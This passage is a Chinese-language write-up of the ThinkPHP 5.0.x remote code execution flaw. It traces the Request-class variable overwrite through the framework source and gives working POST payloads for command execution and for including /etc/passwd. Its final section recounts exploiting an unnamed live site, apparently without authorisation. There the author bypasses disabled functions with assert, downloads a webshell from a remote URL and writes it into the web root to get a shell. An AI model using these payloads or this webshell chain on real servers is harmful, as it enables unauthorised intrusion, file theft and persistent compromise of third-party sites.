                    $this->$name = $item;
                }
            }
            if (is_null($this->filter)) {
                $this->filter = Config::get('default_filter');
            }
            // 保存 php://input
            $this->input = file_get_contents('php://input');
        }
此处存在任意属性赋值，意味着可以将`Reqeust`类中的属性的值通过POST来任意改变，前文不是需要控制回调方法的回调函数，即`$this->filter`吗？在这里就可以通过构造函数直接赋值，即`_method=__construct&filter[]=system`，有了这些之后，我们只需要回调函数的参数，回到上述分析的`param`方法中，
    $this->param      = array_merge($this->param, $this->get(false), $vars, $this->route(false));
作为`$data`传入`input`方法，跟进`$this->get`
    public function get($name = '', $default = null, $filter = '')
        {
            if (empty($this->get)) {
                $this->get = $_GET;
            }
            if (is_array($name)) {
                $this->param      = [];
                $this->mergeParam = false;
                return $this->get = array_merge($this->get, $name);
            }
            return $this->input($this->get, $name, $default, $filter);
        }
如果`$this->get`为空，直接将其赋值为`$_GET`,而最后将`$this->get`作为`input`方法的第一个参数，因此我们可以听过变量覆盖，直接将`$this->get`赋值，就此我们控制了回调函数和参数。
即`_method=__construct&filter[]=system&get[]=whoami`或者`_method=__construct&filter[]=system&route[]=whoami`
上面只是漏洞产生原理的分析，我们还需要了解怎么调用的`Request`类的`method`方法以及`param`方法，全局搜索一下发现
`thinkphp/library/think/Route.php`
`$request->method()`没有任何参数，选取默认参数为`false`，符合上述的逻辑链，因此在全局搜索`$check`的上层利用链
`thinkphp/library/think/APP.app`中
该语句包含在`if($check)`条件下，只有`$check==true`时，才会进入执行该语句，可以看到路由检测中，如果`self::$routeCheck`为空，则会将`$condig['url_route_on']`赋值给`$check`，而在配置文件中该值默认为==true==。
当我们跟随入口文件`index.php`时会发现，一定会调用`APP:run()`,该类为应用程序启动类，调用该方法执行应用，跟进
当`$dispatch`为空时，调用`routeCheck`方法，跟进`Hook::listen('app_dispatch',self::$dispatch)`发现：
没有涉及`$dispatch`，因此`self::$dispatch`为空，这样最终能够能够调用`$request->method()`方法，接下来是`Request`对象`param`方法的触发流程:
全局搜索`param`方法发现该如下几处调用了`Reqeust::method()`
`APP::run()`
    // 记录路由和请求信息
                if (self::$debug) {
                    Log::record('[ ROUTE ] ' . var_export($dispatch, true), 'info');
                    Log::record('[ HEADER ] ' . var_export($request->header(), true), 'info');
                    Log::record('[ PARAM ] ' . var_export($request->param(), true), 'info');
                }
可知如果开了调试模式的话，在启动执行应用程序时会自动调用`$request->param()`方法。因此当开启调式模式时，我们的分析利用链到此时已经结束，可以构造相应`payload`
    POST:_method=__construct&filter[]=system&get[]=whoami  or _method=__construct&filter[]=system&route[]=whoami
如果关闭了调试状态（通常情况下也会关闭调试状态），则需要搜索其他利用链
`APP::exec()`
    protected static function exec($dispatch, $config)
        {
            switch ($dispatch['type']) {
                case 'redirect': // 重定向跳转
                    $data = Response::create($dispatch['url'], 'redirect')
                        ->code($dispatch['status']);
                    break;
                case 'module': // 模块/控制器/操作
                    $data = self::module(
                        $dispatch['module'],
                        $config,
                        isset($dispatch['convert']) ? $dispatch['convert'] : null
                    );
                    break;
                case 'controller': // 执行控制器操作
                    $vars = array_merge(Request::instance()->param(), $dispatch['var']);
                    $data = Loader::action(
                        $dispatch['controller'],
                        $vars,
                        $config['url_controller_layer'],
                        $config['controller_suffix']
                    );
                    break;
                case 'method': // 回调方法
                    $vars = array_merge(Request::instance()->param(), $dispatch['var']);
                    $data = self::invokeMethod($dispatch['method'], $vars);
                    break;
                case 'function': // 闭包
                    $data = self::invokeFunction($dispatch['function']);
                    break;
                case 'response': // Response 实例
                    $data = $dispatch['response'];
                    break;
                default:
                    throw new \InvalidArgumentException('dispatch type not support');
            }
            return $data;
        }
当`$dispatch['type']==method或者$dispatch['type']==controller`时，会调用`param()`方法，而在`APP::run`中调用了
**exec** 方法，所以我们只需要控制调度信息`$dispatch`的值
`APP:run()`中跟进`routeCheck()`方法：
路由有效时跟进`Route::check()`方法：
当我们需要 **$dispatch[‘type’]** 等于 **controller** 或者 **method**
时，最终跟进到`Route::parseRule`方法
当路由执行为 **路由到方法** 或者 **路由到控制器** 时都能使得`$result['type']`满足，即最后
**$dispatch[‘type’]** 等于 **controller** 或者 **method** 而调用`param`方法。
ThinkPHP路由地址表示定义的路由表达式最终需要路由到的地址以及一些需要的额外参数，支持下面5种方式定义：
定义方式 | 定义格式  
---|---  
方式1：路由到模块/控制器 | ‘[模块/控制器/操作]?额外参数1=值1&额外参数2=值2…’  
方式2：路由到重定向地址 | ‘外部地址’（默认301重定向） 或者 [‘外部地址’,’重定向代码’]  
方式3：路由到控制器的方法 | ‘@[模块/控制器/]操作’  
方式4：路由到类的方法 | ‘\完整的命名空间类::静态方法’ 或者 ‘\完整的命名空间类@动态方法’  
方式5：路由到闭包函数 | 闭包函数定义（支持参数传入）  
而路由到控制器还是到方法等是取决于`$route`，因此还需分析`$route`取值，在`checkRoute`的构造方法中：
因此分析`checkRoute`的上层利用链，在`Route::check()`方法中发现：
该`$method`可以通过变量覆盖将其改变，因此需要寻找注册`$method`值的路由，ThinkPHP5
中自带的验证码组件captcha注册了一个`get`路由规则，路由到类的方法，满足case条件。这里可以知道`method=get`是为了正确获取captcha的路由规则。
因此可以构造相应 **payload**
    POST /index.php?s=captcha&_method=__construct&method=get&filter[]=system&get[]=ipconfig
## 任意文件包含
根据以上分析，在该版本`ThinkPHP`中还存在任意文件包含，在`thinkphp\library\think\Loader.php`中存在`__include_file`方法：
    namespace think;
    ...
    function __include_file($file)
    {
        return include $file;
    }
可以通过回调函数`call_user_func`调用`think\__include_file`，可以构造相应payload
    POST /index.php?s=captcha 
    _method=__construct&method=GET&filter[]=think\__include_file&server[REQUEST_METHOD]==/etc/passwd
注意调用该方法时会进入`Request.php`中的`param`方法：
​ `method`方法本来是`false`默认参数，现在参数为`true`，我们跟进看一下其逻辑:
直接进入第一个`if`语句中，调用关键方法`server()`，在不妨跟进:
    public function server($name = '', $default = null, $filter = '')
        {
            if (empty($this->server)) {
                $this->server = $_SERVER;
            }
            if (is_array($name)) {
                return $this->server = array_merge($this->server, $name);
            }
            return $this->input($this->server, false === $name ? false : strtoupper($name), $default, $filter);
        }
上文已分析过，`$this->input()`第一个参数，即使回调函数的参数，因此`$this->server`将是我们想要执行方法的参数，此处我们执行的`think\__include_file`方法，因此我们要改变`$this->server`的值，由于`$server`为`Request`类的属性，根据上文变量覆盖利用，我们利用变量覆盖使得`$_SERVER[REQUEST_METHOD]`为参数，这样就能利用`include`进行任意文件包含。
## 实际利用
发现某站部署`Thinkphp v5`系统，并且在系统配置中是默认配置的`debug`模式：
在`debug`状态下，我们知道网站的绝对路径，并且`ThinkPHP`版本号为`V5.0.x`，由于开启`debug`状态，构造相应`payload`进行探测
    POST:_method=__construct&filter[]=system&get[]=whoami
发现 **php** 配置文件中应该设置了`disabled_function`:
我们知道在`phpinfo()`中即使加入参数，也不影响其执行，因此`call_user_func('phpinfo()','1')`同样能够执行
先看一波`phpinfo`看看禁用哪些函数,发现还设置了`open_basedir`
    passthru,exec,system,chroot,chgrp,chown,shell_exec,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru
把最为常用的函数禁用了，当该PHP版本低于 **7.2**
,因此`assert`这个关键的函数并没有过滤，也就意味着我们能先使用`assert`来做一些操作，本来是直接构造
    POST:_method=__construct&filter[]=assert&get[]=assert($_POST[1]);
然后用`antsword`连上就好，但是发现并不能成功连接，原因可能是`antsword`和菜刀仅支持`eval`后门，可能现在就需要换一换思路:
在默认配置中，`file_get_contents`可以读取 **URL**
内容并进行输出，并且`file_get_contents`是不会被ban的，这里先验证一下:
    POST:_method=__construct&filter[]=assert&get[]=assert($_POST[1]);&1=print(file_get_contents("./index.php"));
因此直接结合网站绝对路径，我们知道在`public`是面向用户的，我们可以利用`file_get_contents`读取马后使用`file_put_contents`写入到`public`目录下，这样就能够一句话进行连接
    _method=__construct&filter[]=assert&get[]=$a=(file_get_contents("http://马的地址"));$b=file_put_contents('网站根目录/public/xxx.php',$a);
最终`getshell`
可见如果目前还在使用`Thinkphp5.0`版本是十分危险的，应该及时更新版本或者相应打上补丁